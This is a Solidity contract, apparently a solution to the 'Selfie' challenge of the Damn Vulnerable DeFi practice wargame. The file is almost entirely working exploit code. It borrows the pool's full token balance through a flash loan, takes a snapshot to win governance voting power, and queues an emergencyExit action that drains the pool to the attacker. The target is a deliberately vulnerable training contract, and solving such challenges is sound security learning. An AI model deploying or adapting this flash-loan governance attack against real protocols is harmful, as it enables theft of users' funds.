// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";


contract SelfiePoolHack is IERC3156FlashBorrower {
  bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
  address private player;
  SelfiePool private pool;
  SimpleGovernance private governance;

  constructor(address _player, SelfiePool _pool, SimpleGovernance _governance) {
    player = _player;
    pool = _pool;
    governance = _governance;
  }

  function hack() external {
    pool.flashLoan(IERC3156FlashBorrower(this), address(pool.token()), pool.token().balanceOf(address(pool)), "");
  }

  function onFlashLoan(address, address, uint256 _amount, uint256, bytes calldata) external returns (bytes32) {
    DamnValuableTokenSnapshot(address(pool.token())).snapshot();
    pool.token().approve(address(pool), _amount);
    governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", player));
    return CALLBACK_SUCCESS;
  }

}
